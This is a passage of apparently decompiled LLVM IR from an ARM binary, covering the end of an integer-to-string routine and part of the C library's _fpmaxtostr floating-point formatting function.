  %v1_1a2d4 = phi i32 [ 0, %dec_label_pc_1a2a0 ], [ %v2_1a23c, %dec_label_pc_1a238 ]
  %v2_1a268.pn = phi i32 [ %v0_1a2a4, %dec_label_pc_1a2a0 ], [ %v2_1a268, %dec_label_pc_1a238 ]
  store i32 %storemerge28, i32* %r6.global-to-local, align 4
  %v0_1a2c0 = urem i32 %v2_1a268.pn, %v0_1a2ac
  %v2_1a2bc = icmp ugt i32 %v0_1a2c0, 8
  %v7_1a2bc = icmp eq i32 %v0_1a2c0, 9
  store i1 %v7_1a2bc, i1* %cpsr_z.global-to-local, align 1
  %v1_1a2c4 = add i32 %v0_1a2c0, 48
  %v0_1a2cc = load i32, i32* %r8.global-to-local, align 4
  %v1_1a2cc = add i32 %v0_1a2cc, -1
  store i32 %v1_1a2cc, i32* %r8.global-to-local, align 4
  %v2_1a2d0 = xor i1 %v7_1a2bc, true
  %v3_1a2d0 = and i1 %v2_1a2bc, %v2_1a2d0
  %extract.t = trunc i32 %v1_1a2c4 to i8
  br i1 %v3_1a2d0, label %bb24, label %bb25

bb24:                                             ; preds = %dec_label_pc_1a2b8
  %v2_1a2c0 = add i32 %v0_1a2c0, %tmp11
  %extract.t9 = trunc i32 %v2_1a2c0 to i8
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_1a2b8, %bb24
  %v0_1a2d8.off0 = phi i8 [ %extract.t, %dec_label_pc_1a2b8 ], [ %extract.t9, %bb24 ]
  %v2_1a2d4 = or i32 %v0_1a2d4, %v1_1a2d4
  %v4_1a2d4 = icmp eq i32 %v2_1a2d4, 0
  store i1 %v4_1a2d4, i1* %cpsr_z.global-to-local, align 1
  %v3_1a2d8 = inttoptr i32 %v1_1a2cc to i8*
  store i8 %v0_1a2d8.off0, i8* %v3_1a2d8, align 1
  %v0_1a2dc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a2dc, label %dec_label_pc_1a2e0, label %dec_label_pc_1a228thread-pre-split

dec_label_pc_1a2e0:                               ; preds = %bb25
  %v4_1a2e010 = zext i8 %storemerge to i32
  store i32 %v4_1a2e010, i32* @r3, align 4
  %v2_1a2e4 = icmp eq i8 %storemerge, 0
  store i1 %v2_1a2e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a2e4, label %dec_label_pc_1a2e0..thread2_crit_edge, label %bb26

dec_label_pc_1a2e0..thread2_crit_edge:            ; preds = %dec_label_pc_1a2e0
  %v0_1a2f0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb26:                                             ; preds = %dec_label_pc_1a2e0
  store i32 45, i32* @r3, align 4
  %v3_1a2ec = load i32, i32* %r8.global-to-local, align 4
  %v4_1a2ec = add i32 %v3_1a2ec, -1
  %v5_1a2ec = inttoptr i32 %v4_1a2ec to i8*
  store i8 45, i8* %v5_1a2ec, align 1
  %v6_1a2ec = load i32, i32* %r8.global-to-local, align 4
  %v7_1a2ec = add i32 %v6_1a2ec, -1
  store i32 %v7_1a2ec, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1a2e0..thread2_crit_edge, %bb26
  %v0_1a2f0 = phi i32 [ %v0_1a2f0.pre, %dec_label_pc_1a2e0..thread2_crit_edge ], [ %v7_1a2ec, %bb26 ]
  ret i32 %v0_1a2f0

; uselistorder directives
  uselistorder i32 %v0_1a2c0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1a2ac, { 0, 6, 1, 2, 3, 5, 4 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_1a1b8, { 1, 0, 2 }
  uselistorder i32 %tmp21, { 0, 3, 2, 1 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 1, { 4, 1, 5, 6, 7, 8, 9, 0, 27, 28, 25, 26, 23, 24, 22, 20, 21, 19, 16, 17, 18, 13, 14, 11, 12, 2, 3, 15, 10, 29 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_1a2b8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1a1ec, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp160 = bitcast float %tmp to i32
  store i32 %tmp160, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v27_1a300 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_1a30c = add i32 %arg4, 8
  %v2_1a30c = inttoptr i32 %v1_1a30c to i8*
  %v3_1a30c = load i8, i8* %v2_1a30c, align 1
  %v4_1a30c = zext i8 %v3_1a30c to i32
  store i32 %v4_1a30c, i32* %sb.global-to-local, align 4
  %v1_1a310 = or i32 %v4_1a30c, 32
  %v7_1a314 = icmp eq i32 %v1_1a310, 97
  store i1 %v7_1a314, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_1a32c = inttoptr i32 %arg4 to i32*
  %v2_1a32c = load i32, i32* %v1_1a32c, align 4
  store i32 %v2_1a32c, i32* %fp.global-to-local, align 4
  store i32 %arg4, i32* %lr.global-to-local, align 4
  %v0_1a334 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1a334, i32* %r6.global-to-local, align 4
  store i32 73208, i32* %ip.global-to-local, align 4
  br i1 %v7_1a314, label %bb, label %bb201

bb:                                               ; preds = %entry
  %v2_1a33c = add nuw nsw i32 %v4_1a30c, 6
  store i32 %v2_1a33c, i32* %r3.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %entry, %bb
  %v1_1a34c = phi i32 [ %v0_1a334, %entry ], [ %v2_1a33c, %bb ]
  store i32 %tmp160, i32* %r5.global-to-local, align 4
  %v1_1a344 = add i32 %arg4, 12
  %v2_1a344 = inttoptr i32 %v1_1a344 to i32*
  %v3_1a344 = load i32, i32* %v2_1a344, align 4
  store i32 %v3_1a344, i32* %r2.global-to-local, align 4
  %v1_1a348 = add i32 %arg4, 4
  %v2_1a348 = inttoptr i32 %v1_1a348 to i32*
  %v3_1a348 = load i32, i32* %v2_1a348, align 4
  store i32 %v3_1a348, i32* @lr, align 4
  br i1 %v7_1a314, label %bb202, label %bb203

bb202:                                            ; preds = %bb201
  %v2_1a34c = urem i32 %v1_1a34c, 256
  store i32 %v2_1a34c, i32* %sb.global-to-local, align 4
  br label %bb203

bb203:                                            ; preds = %bb201, %bb202
  %v1_1a350 = icmp slt i32 %v2_1a32c, 0
  %v2_1a350 = icmp eq i32 %v2_1a32c, 0
  store i1 %v2_1a350, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* %ip.global-to-local, align 4
  br i1 %v1_1a350, label %bb204, label %bb205

bb204:                                            ; preds = %bb203
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %bb203, %bb204
  %v1_1a360 = and i32 %v3_1a344, 2
  %v2_1a360 = icmp eq i32 %v1_1a360, 0
  store i1 %v2_1a360, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_1a360, label %dec_label_pc_1a378, label %dec_label_pc_1a384

dec_label_pc_1a378:                               ; preds = %bb205
  %v1_1a378 = urem i32 %v3_1a344, 2
  %v2_1a378 = icmp eq i32 %v1_1a378, 0
  store i1 %v2_1a378, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a378, label %dec_label_pc_1a388, label %dec_label_pc_1a384

dec_label_pc_1a384:                               ; preds = %dec_label_pc_1a378, %bb205
  %storemerge = phi i32 [ 43, %bb205 ], [ 32, %dec_label_pc_1a378 ]
  %v0_1a384.off0 = phi i8 [ 43, %bb205 ], [ 32, %dec_label_pc_1a378 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_1a384.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_1a388

dec_label_pc_1a388:                               ; preds = %dec_label_pc_1a378, %dec_label_pc_1a384
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_1a334, i32* %r3.global-to-local, align 4
  store i32 %tmp160, i32* @r0, align 4
  store i32 %v0_1a334, i32* %r1.global-to-local, align 4
  store i32 %tmp160, i32* @r2, align 4
  %v1_1a3a4 = fptrunc double %arg2 to float
  %v2_1a3a4 = bitcast float %v1_1a3a4 to i32
  %v9_1a3a4 = call i32 @__aeabi_dcmpeq(i32 %v2_1a3a4, i32 %v0_1a334, i32 %v2_1a3a4, i32 %v0_1a334, i32 0)
  store i32 %v9_1a3a4, i32* %r0.global-to-local, align 4
  %v2_1a3a8 = icmp eq i32 %v9_1a3a4, 0
  store i1 %v2_1a3a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a3a8, label %bb207, label %dec_label_pc_1a3b8

bb207:                                            ; preds = %dec_label_pc_1a388
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a46c

dec_label_pc_1a3b8:                               ; preds = %dec_label_pc_1a388
  %v0_1a3b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1a3b8, i32* @r0, align 4
  %v0_1a3bc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1a3bc, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_1a3c8 = call i32 @__aeabi_dcmpeq(i32 %v0_1a3b8, i32 %v0_1a3bc, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_1a3c8, i32* %r0.global-to-local, align 4
  %v2_1a3cc = icmp eq i32 %v7_1a3c8, 0
  store i1 %v2_1a3cc, i1* %cpsr_z.global-to-local, align 1
  %v0_1a414 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a414 = sext i32 %v0_1a414 to i64
  %v2_1a414 = bitcast i64 %v1_1a414 to double
  br i1 %v2_1a3cc, label %dec_label_pc_1a414, label %dec_label_pc_1a3d4

dec_label_pc_1a3d4:                               ; preds = %dec_label_pc_1a3b8
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v9_1a3e4 = fdiv double 0.000000e+00, %v2_1a414
  %v10_1a3e4 = fptrunc double %v9_1a3e4 to float
  %v11_1a3e4 = bitcast float %v10_1a3e4 to i32
  store i32 %v11_1a3e4, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_1a3f0 = call i32 @__aeabi_dcmplt(i32 %v11_1a3e4, i32 1072693248, i32 0, i32 0)
  store i32 %v4_1a3f0, i32* %r0.global-to-local, align 4
  %v2_1a3f4 = icmp eq i32 %v4_1a3f0, 0
  store i1 %v2_1a3f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a3f4, label %bb208, label %dec_label_pc_1a400

bb208:                                            ; preds = %dec_label_pc_1a3d4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a5e0

dec_label_pc_1a400:                               ; preds = %dec_label_pc_1a3d4
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_1a5e0

dec_label_pc_1a414:                               ; preds = %dec_label_pc_1a3b8
  store i32 %v0_1a414, i32* @r0, align 4
  %v0_1a418 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1a418, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1a424 = fptrunc double %v2_1a414 to float
  %v2_1a424 = bitcast float %v1_1a424 to i32
  %v6_1a424 = call i32 @__aeabi_dcmplt(i32 %v2_1a424, i32 %v0_1a418, i32 0, i32 0)
  store i32 %v6_1a424, i32* %r0.global-to-local, align 4
  %v2_1a428 = icmp eq i32 %v6_1a424, 0
  store i1 %v2_1a428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a428, label %dec_label_pc_1a414..thread10_crit_edge, label %bb209

dec_label_pc_1a414..thread10_crit_edge:           ; preds = %dec_label_pc_1a414
  %v0_1a448.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread10

bb209:                                            ; preds = %dec_label_pc_1a414
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_1a430 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a430 = sub i32 0, %v1_1a430
  store i32 %v2_1a430, i32* %r4.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_1a430, i32* %r6.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_1a414..thread10_crit_edge, %bb209
  %v0_1a448 = phi i32 [ %v0_1a448.pre, %dec_label_pc_1a414..thread10_crit_edge ], [ %v2_1a430, %bb209 ]
  %v0_1a444 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a444 = sext i32 %v0_1a444 to i64
  %v2_1a444 = bitcast i64 %v1_1a444 to double
  %v9_1a44c = fmul double %v2_1a444, 0.000000e+00
  %v10_1a44c = fptrunc double %v9_1a44c to float
  %v11_1a44c = bitcast float %v10_1a44c to i32
  store i32 %v11_1a44c, i32* @r2, align 4
  store i32 %v0_1a448, i32* %r3.global-to-local, align 4
  store i32 %v0_1a444, i32* @r0, align 4
  store i32 %v0_1a448, i32* %r1.global-to-local, align 4
  %v7_1a460 = call i32 @__aeabi_dcmpeq(i32 %v0_1a444, i32 %v0_1a448, i32 %v11_1a44c, i32 %v0_1a448, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_1a460, i32* %r0.global-to-local, align 4
  %v2_1a464 = icmp eq i32 %v7_1a460, 0
  store i1 %v2_1a464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a464, label %dec_label_pc_1a4b8, label %.thread10.dec_label_pc_1a46c_crit_edge

.thread10.dec_label_pc_1a46c_crit_edge:           ; preds = %.thread10
  %v3_1a46c.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_1a46c

dec_label_pc_1a46c:                               ; preds = %bb207, %.thread10.dec_label_pc_1a46c_crit_edge
  %v3_1a46c = phi i32 [ %v3_1a46c.pre, %.thread10.dec_label_pc_1a46c_crit_edge ], [ %arg4, %bb207 ]
  %v1_1a3b0.v0_1a39c6 = phi i32 [ 0, %.thread10.dec_label_pc_1a46c_crit_edge ], [ 8, %bb207 ]
  store i32 %v3_1a46c, i32* %ip.global-to-local, align 4
  %v2_1a474 = add i32 %v3_1a46c, 16
  %v3_1a474 = inttoptr i32 %v2_1a474 to i32*
  store i32 32, i32* %v3_1a474, align 4
  %v0_1a47c = load i32, i32* %sb.global-to-local, align 4
  %v7_1a47c = icmp eq i32 %v0_1a47c, 96
  store i1 %v7_1a47c, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp274 = icmp ult i32 %v0_1a47c, 97
  br i1 %tmp274, label %bb210, label %.thread124

bb210:                                            ; preds = %dec_label_pc_1a46c
  %v5_1a490 = or i32 %v1_1a3b0.v0_1a39c6, 4
  store i32 %v5_1a490, i32* %r3.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_1a46c, %bb210
  %v4_1a494 = phi i32 [ %v5_1a490, %bb210 ], [ 3, %dec_label_pc_1a46c ]
  %v4_1a494.v1_1a3b0.v0_1a39c = select i1 %tmp274, i32 %v4_1a494, i32 %v1_1a3b0.v0_1a39c6
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33072), i32* %r3.global-to-local, align 4
  %v2_1a4a8 = add nsw i32 %v4_1a494.v1_1a3b0.v0_1a39c, add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33072)
  store i32 %v2_1a4a8, i32* %r2.global-to-local, align 4
  %v2_1a4ac = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_1a4ac, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a9d4

dec_label_pc_1a4b8:                               ; preds = %.thread10
  %v0_1a4b8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1a4b8, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_1a4c0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1a4c0, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v6_1a4c8 = call i32 @__aeabi_dcmplt(i32 %v0_1a4c0, i32 %v0_1a4b8, i32 0, i32 1100470148)
  store i32 %v6_1a4c8, i32* %r0.global-to-local, align 4
  %v2_1a4cc = icmp eq i32 %v6_1a4c8, 0
  store i1 %v2_1a4cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a4cc, label %bb212, label %bb211

bb211:                                            ; preds = %dec_label_pc_1a4b8
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_1a4b8, %bb211
  %v0_1a4d4 = phi i32 [ 0, %dec_label_pc_1a4b8 ], [ 1, %bb211 ]
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33048), i32* %r3.global-to-local, align 4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33048), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* %r4.global-to-local, align 4
  %v2_1a508 = icmp eq i32 %v0_1a4d4, 0
  br label %dec_label_pc_1a4f8

dec_label_pc_1a4f8:                               ; preds = %dec_label_pc_1a590.dec_label_pc_1a4f8_crit_edge, %bb212
  %v2_1a500 = phi i32 [ add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33048), %bb212 ], [ %v2_1a500.pre, %dec_label_pc_1a590.dec_label_pc_1a4f8_crit_edge ]
  %v0_1a4fc = phi i32 [ 9, %bb212 ], [ %v0_1a590, %dec_label_pc_1a590.dec_label_pc_1a4f8_crit_edge ]
  %v2_1a540 = phi i32 [ 8, %bb212 ], [ %stack_var_-192.3, %dec_label_pc_1a590.dec_label_pc_1a4f8_crit_edge ]
  store i32 %v0_1a4d4, i32* %r2.global-to-local, align 4
  %v1_1a4fc = add i32 %v0_1a4fc, -1
  store i32 %v1_1a4fc, i32* %sl.global-to-local, align 4
  store i32 %v2_1a500, i32* @lr, align 4
  %v3_1a504 = mul i32 %v1_1a4fc, 8
  store i32 %v3_1a504, i32* %r3.global-to-local, align 4
  store i1 %v2_1a508, i1* %cpsr_z.global-to-local, align 1
  %v0_1a50c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1a50c, i32* %r0.global-to-local, align 4
  %v0_1a510 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1a510, i32* %r1.global-to-local, align 4
  %v2_1a514 = add i32 %v3_1a504, %v2_1a500
  store i32 %v2_1a514, i32* %ip.global-to-local, align 4
  %v1_1a550 = inttoptr i32 %v2_1a514 to i32*
  %v2_1a550 = load i32, i32* %v1_1a550, align 4
  %v3_1a550 = sext i32 %v2_1a550 to i64
  %v1_1a554 = sext i32 %v0_1a50c to i64
  %v2_1a554 = bitcast i64 %v1_1a554 to double
  br i1 %v2_1a508, label %dec_label_pc_1a550, label %dec_label_pc_1a51c

dec_label_pc_1a51c:                               ; preds = %dec_label_pc_1a4f8
  %v8_1a520 = bitcast i64 %v3_1a550 to double
  %v9_1a520 = fmul double %v2_1a554, %v8_1a520
  %v10_1a520 = fptrunc double %v9_1a520 to float
  %v11_1a520 = bitcast float %v10_1a520 to i32
  store i32 %v11_1a520, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v11_1a520, i32* %r7.global-to-local, align 4
  store i32 %v0_1a510, i32* %r8.global-to-local, align 4
  %v4_1a534 = call i32 @__aeabi_dcmplt(i32 %v11_1a520, i32 %v0_1a510, i32 0, i32 1104006501)
  store i32 %v4_1a534, i32* %r0.global-to-local, align 4
  %v2_1a538 = icmp eq i32 %v4_1a534, 0
  store i1 %v2_1a538, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a538, label %dec_label_pc_1a590, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_1a51c
  %v1_1a540 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a540 = sub i32 %v2_1a540, %v1_1a540
  store i32 %v3_1a540, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a588

dec_label_pc_1a550:                               ; preds = %dec_label_pc_1a4f8
  store i32 %v0_1a510, i32* @r1, align 4
  %v8_1a55c = bitcast i64 %v3_1a550 to double
  %v9_1a55c = fdiv double %v2_1a554, %v8_1a55c
  %v10_1a55c = fptrunc double %v9_1a55c to float
  %v11_1a55c = bitcast float %v10_1a55c to i32
  store i32 %v11_1a55c, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v11_1a55c, i32* %r7.global-to-local, align 4
  store i32 %v0_1a510, i32* %r8.global-to-local, align 4
  %v4_1a570 = call i32 @__aeabi_dcmpge(i32 %v11_1a55c, i32 %v0_1a510, i32 0, i32 1100470148)
  store i32 %v4_1a570, i32* %r0.global-to-local, align 4
  %v2_1a574 = icmp eq i32 %v4_1a570, 0
  store i1 %v2_1a574, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a574, label %dec_label_pc_1a590, label %dec_label_pc_1a57c

dec_label_pc_1a57c:                               ; preds = %dec_label_pc_1a550
  %v1_1a580 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a580 = add i32 %v1_1a580, %v2_1a540
  store i32 %v2_1a580, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a588

dec_label_pc_1a588:                               ; preds = %.thread11, %dec_label_pc_1a57c
  %stack_var_-192.2 = phi i32 [ %v2_1a580, %dec_label_pc_1a57c ], [ %v3_1a540, %.thread11 ]
  %v0_1a588 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1a588, i32* %r5.global-to-local, align 4
  %v0_1a58c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1a58c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a590

dec_label_pc_1a590:                               ; preds = %dec_label_pc_1a51c, %dec_label_pc_1a550, %dec_label_pc_1a588
  %stack_var_-192.3 = phi i32 [ %v2_1a540, %dec_label_pc_1a550 ], [ %stack_var_-192.2, %dec_label_pc_1a588 ], [ %v2_1a540, %dec_label_pc_1a51c ]
  %v0_1a590 = load i32, i32* %sl.global-to-local, align 4
  %v2_1a590 = icmp eq i32 %v0_1a590, 0
  store i1 %v2_1a590, i1* %cpsr_z.global-to-local, align 1
  %v0_1a594 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a594 = sdiv i32 %v0_1a594, 2
  store i32 %v3_1a594, i32* %r4.global-to-local, align 4
  br i1 %v2_1a590, label %dec_label_pc_1a59c, label %dec_label_pc_1a590.dec_label_pc_1a4f8_crit_edge

dec_label_pc_1a590.dec_label_pc_1a4f8_crit_edge:  ; preds = %dec_label_pc_1a590
  %v2_1a500.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_1a4f8

dec_label_pc_1a59c:                               ; preds = %dec_label_pc_1a590
  %v0_1a59c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1a59c, i32* @r0, align 4
  %v0_1a5a0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1a5a0, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v6_1a5ac = call i32 @__aeabi_dcmpge(i32 %v0_1a59c, i32 %v0_1a5a0, i32 0, i32 1104006501)
  store i32 %v6_1a5ac, i32* %r0.global-to-local, align 4
  %v2_1a5b0 = icmp eq i32 %v6_1a5ac, 0
  store i1 %v2_1a5b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a5b0, label %dec_label_pc_1a5e0, label %dec_label_pc_1a5b8

dec_label_pc_1a5b8:                               ; preds = %dec_label_pc_1a59c
  %v0_1a5b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a5b8 = sext i32 %v0_1a5b8 to i64
  %v2_1a5b8 = bitcast i64 %v1_1a5b8 to double
  %v0_1a5bc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1a5bc, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v9_1a5c8 = fdiv double %v2_1a5b8, 0.000000e+00
  %v10_1a5c8 = fptrunc double %v9_1a5c8 to float
  %v11_1a5c8 = bitcast float %v10_1a5c8 to i32
  store i32 %v11_1a5c8, i32* %r0.global-to-local, align 4
  store i32 %v11_1a5c8, i32* %r5.global-to-local, align 4
  %v1_1a5d8 = add i32 %stack_var_-192.3, 1
  store i32 %v1_1a5d8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a5e0

dec_label_pc_1a5e0:                               ; preds = %dec_label_pc_1a5b8, %bb208, %dec_label_pc_1a59c, %dec_label_pc_1a400
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_1a59c ], [ -1, %dec_label_pc_1a400 ], [ -1, %bb208 ], [ %v1_1a5d8, %dec_label_pc_1a5b8 ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1a5e4 = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_1a5e4, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1a5e8

dec_label_pc_1a5e8:                               ; preds = %dec_label_pc_1a660, %dec_label_pc_1a5e0
  %v0_1a5e8 = load i32, i32* %r6.global-to-local, align 4
  %v0_1a5ec = load i32, i32* %r5.global-to-local, align 4
  %v1_1a5f0 = sext i32 %v0_1a5ec to i64
  %v2_1a5f0 = bitcast i64 %v1_1a5f0 to double
  %v3_1a5f0 = fptoui double %v2_1a5f0 to i32
  store i32 %v3_1a5f0, i32* %r8.global-to-local, align 4
  store i32 %v3_1a5f0, i32* %r2.global-to-local, align 4
  store i32 %v0_1a5e8, i32* %r3.global-to-local, align 4
  store i32 %v0_1a5ec, i32* @r0, align 4
  store i32 %v0_1a5e8, i32* %r1.global-to-local, align 4
  %v6_1a60c = call i32 @__aeabi_dsub(i32 %v0_1a5ec, i32 %v0_1a5e8, i32 %v3_1a5f0, i32 %v0_1a5e8)
  %v7_1a60c = sext i32 %v6_1a60c to i64
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v3_1a618 = bitcast i64 %v7_1a60c to double
  %v9_1a618 = fmul double %v3_1a618, 0.000000e+00
  %v10_1a618 = fptrunc double %v9_1a618 to float
  %v11_1a618 = bitcast float %v10_1a618 to i32
  store i32 %v11_1a618, i32* %r0.global-to-local, align 4
  %v0_1a61c = load i32, i32* %sl.global-to-local, align 4
  %v1_1a61c = add i32 %v0_1a61c, 9
  store i32 %v1_1a61c, i32* %sl.global-to-local, align 4
  store i32 %v11_1a618, i32* %r5.global-to-local, align 4
  store i32 %v0_1a5e8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1a62c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a62c

dec_label_pc_1a62c:                               ; preds = %dec_label_pc_1a62c.dec_label_pc_1a62c_crit_edge, %dec_label_pc_1a5e8
